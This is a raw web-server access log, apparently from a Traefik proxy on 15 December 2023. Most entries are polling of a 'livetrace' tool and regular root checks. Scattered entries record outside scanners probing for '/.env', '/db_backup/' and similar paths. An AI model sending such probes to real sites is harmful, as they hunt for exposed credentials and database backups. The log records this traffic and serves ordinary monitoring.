172.59.224.194 - - [15/Dec/2023:17:15:52 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1519 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:15:53 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1520 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:15:54 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1521 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:15:55 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1522 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:15:56 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1523 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.224.194 - - [15/Dec/2023:17:15:57 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1524 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.224.194 - - [15/Dec/2023:17:15:58 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 113 "-" "-" 1525 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:15:58 +0000] "GET /trace/cleanup.php?id=kl8cqkull HTTP/2.0" 200 71 "-" "-" 1526 "livetrace@docker" "http://172.28.0.5:80" 3ms
172.59.224.194 - - [15/Dec/2023:17:16:11 +0000] "GET /trace/start.php?id=rw4pm3d7v HTTP/2.0" 200 104 "-" "-" 1527 "livetrace@docker" "http://172.28.0.5:80" 3ms
172.59.224.194 - - [15/Dec/2023:17:16:12 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1528 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:16:13 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1529 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:16:14 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1530 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:16:15 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1531 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.224.194 - - [15/Dec/2023:17:16:16 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1532 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.224.194 - - [15/Dec/2023:17:16:17 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1533 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:16:18 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1534 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:16:19 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1535 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:16:20 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1536 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.224.194 - - [15/Dec/2023:17:16:21 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1537 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:16:22 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1538 "livetrace@docker" "http://172.28.0.5:80" 2ms
159.203.109.206 - - [15/Dec/2023:17:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1539 "www@docker" "http://172.28.0.10:80" 1ms
172.59.224.194 - - [15/Dec/2023:17:16:23 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1540 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.224.194 - - [15/Dec/2023:17:16:24 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1541 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:16:25 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1542 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.224.194 - - [15/Dec/2023:17:16:26 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1543 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:16:27 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1544 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:16:28 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 43 "-" "-" 1545 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:16:29 +0000] "GET /trace/poll.php?id=rw4pm3d7v HTTP/2.0" 200 113 "-" "-" 1546 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:16:29 +0000] "GET /trace/cleanup.php?id=rw4pm3d7v HTTP/2.0" 200 71 "-" "-" 1547 "livetrace@docker" "http://172.28.0.5:80" 2ms
167.71.120.76 - - [15/Dec/2023:17:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1548 "www@docker" "http://172.28.0.10:80" 1ms
172.59.224.194 - - [15/Dec/2023:17:16:44 +0000] "GET /trace/ HTTP/2.0" 200 2243 "-" "-" 1549 "livetrace@docker" "http://172.28.0.5:80" 8ms
172.59.224.194 - - [15/Dec/2023:17:16:56 +0000] "GET /trace/ HTTP/2.0" 200 2243 "-" "-" 1550 "livetrace@docker" "http://172.28.0.5:80" 8ms
159.203.109.206 - - [15/Dec/2023:17:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1551 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1552 "www@docker" "http://172.28.0.10:80" 1ms
167.94.138.127 - - [15/Dec/2023:17:17:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1553 "-" "-" 0ms
167.94.138.127 - - [15/Dec/2023:17:17:50 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1554 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:17:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1555 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1556 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:17:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1557 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1558 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:17:19:41 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1559 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:17:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1560 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1561 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1562 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:17:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1563 "www@docker" "http://172.28.0.10:80" 1ms
185.180.140.5 - - [15/Dec/2023:17:22:11 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1564 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:17:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1565 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1566 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1567 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1568 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:17:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1569 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:17:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1570 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:17:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1571 "www@docker" "http://172.28.0.10:80" 2ms
167.71.120.76 - - [15/Dec/2023:17:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1572 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1573 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1574 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1575 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1576 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1577 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:17:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1578 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1579 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1580 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1581 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1582 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1583 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1584 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1585 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1586 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1587 "www@docker" "http://172.28.0.10:80" 1ms
54.36.115.221 - - [15/Dec/2023:17:33:24 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1588 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [15/Dec/2023:17:33:25 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1589 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:17:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1590 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1591 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1592 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:17:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1593 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1594 "www@docker" "http://172.28.0.10:80" 0ms
218.104.149.5 - - [15/Dec/2023:17:35:51 +0000] "GET / HTTP/1.0" 301 17 "-" "-" 1595 "web-to-websecure@internal" "-" 0ms
61.52.85.6 - - [15/Dec/2023:17:35:55 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 1596 "-" "-" 0ms
58.19.60.143 - - [15/Dec/2023:17:36:04 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1597 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:17:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1598 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:17:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1599 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1600 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:17:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1601 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1602 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1603 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1604 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1605 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1606 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1607 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:17:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1608 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:17:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1609 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1610 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1611 "www@docker" "http://172.28.0.10:80" 1ms
54.37.79.75 - - [15/Dec/2023:17:42:39 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1612 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [15/Dec/2023:17:42:40 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1613 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:17:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1614 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1615 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1616 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1617 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1618 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1619 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1620 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1621 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1622 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1623 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1624 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1625 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1626 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1627 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1628 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1629 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1630 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1631 "www@docker" "http://172.28.0.10:80" 1ms
95.214.235.169 - - [15/Dec/2023:17:52:15 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1632 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [15/Dec/2023:17:52:15 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1633 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:17:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1634 "www@docker" "http://172.28.0.10:80" 1ms
95.214.235.169 - - [15/Dec/2023:17:52:29 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1635 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [15/Dec/2023:17:52:29 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1636 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:17:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1637 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1638 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1639 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1640 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1641 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1642 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1643 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1644 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:17:56:33 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1645 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:17:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1646 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1647 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1648 "www@docker" "http://172.28.0.10:80" 1ms
178.128.84.112 - - [15/Dec/2023:17:58:16 +0000] "GET /Temporary_Listen_Addresses HTTP/1.1" 301 17 "-" "-" 1649 "web-to-websecure@internal" "-" 0ms
178.128.84.112 - - [15/Dec/2023:17:58:16 +0000] "GET /Pages/log/ HTTP/1.1" 301 17 "-" "-" 1650 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:17:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1651 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1652 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1653 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1654 "www@docker" "http://172.28.0.10:80" 1ms
198.235.24.207 - - [15/Dec/2023:17:59:51 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1655 "web-to-websecure@internal" "-" 0ms
198.235.24.207 - - [15/Dec/2023:17:59:51 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1656 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:18:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1657 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:18:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1658 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:18:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1659 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:18:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1660 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:18:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1661 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:18:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1662 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:18:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1663 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:18:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1664 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:18:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1665 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:18:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1666 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:18:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1667 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:18:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1668 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:18:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1669 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:18:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1670 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:18:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1671 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:18:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1672 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:18:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1673 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:18:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1674 "www@docker" "http://172.28.0.10:80" 1ms
185.224.128.142 - - [15/Dec/2023:18:08:42 +0000] "GET /db_backup/ HTTP/1.1" 404 19 "-" "-" 1675 "-" "-" 0ms
185.224.128.142 - - [15/Dec/2023:18:08:42 +0000] "GET /db_backup/ HTTP/1.1" 301 17 "-" "-" 1676 "web-to-websecure@internal" "-" 0ms
185.224.128.142 - - [15/Dec/2023:18:08:42 +0000] "GET /db_backup/ HTTP/1.1" 404 19 "-" "-" 1677 "-" "-" 0ms
51.77.167.122 - - [15/Dec/2023:18:08:56 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1678 "web-to-websecure@internal" "-" 0ms
51.77.167.122 - - [15/Dec/2023:18:08:56 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1679 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:18:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1680 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:18:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1681 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:18:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1682 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:18:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1683 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:18:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1684 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:18:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1685 "www@docker" "http://172.28.0.10:80" 1ms
75.104.92.241 - - [15/Dec/2023:18:11:57 +0000] "GET /trace/start.php?id=l900krkbs HTTP/2.0" 200 103 "-" "-" 1686 "livetrace@docker" "http://172.28.0.5:80" 64ms
75.104.92.241 - - [15/Dec/2023:18:11:59 +0000] "GET /trace/poll.php?id=l900krkbs HTTP/2.0" 200 43 "-" "-" 1687 "livetrace@docker" "http://172.28.0.5:80" 2ms
75.104.92.241 - - [15/Dec/2023:18:12:00 +0000] "GET /trace/poll.php?id=l900krkbs HTTP/2.0" 200 43 "-" "-" 1688 "livetrace@docker" "http://172.28.0.5:80" 2ms
75.104.92.241 - - [15/Dec/2023:18:12:01 +0000] "GET /trace/poll.php?id=l900krkbs HTTP/2.0" 200 43 "-" "-" 1689 "livetrace@docker" "http://172.28.0.5:80" 2ms
75.104.92.241 - - [15/Dec/2023:18:12:02 +0000] "GET /trace/poll.php?id=l900krkbs HTTP/2.0" 200 43 "-" "-" 1690 "livetrace@docker" "http://172.28.0.5:80" 2ms
75.104.92.241 - - [15/Dec/2023:18:12:03 +0000] "GET /trace/poll.php?id=l900krkbs HTTP/2.0" 200 43 "-" "-" 1691 "livetrace@docker" "http://172.28.0.5:80" 2ms
75.104.92.241 - - [15/Dec/2023:18:12:04 +0000] "GET /trace/poll.php?id=l900krkbs HTTP/2.0" 200 43 "-" "-" 1692 "livetrace@docker" "http://172.28.0.5:80" 2ms
75.104.92.241 - - [15/Dec/2023:18:12:05 +0000] "GET /trace/poll.php?id=l900krkbs HTTP/2.0" 200 43 "-" "-" 1693 "livetrace@docker" "http://172.28.0.5:80" 2ms
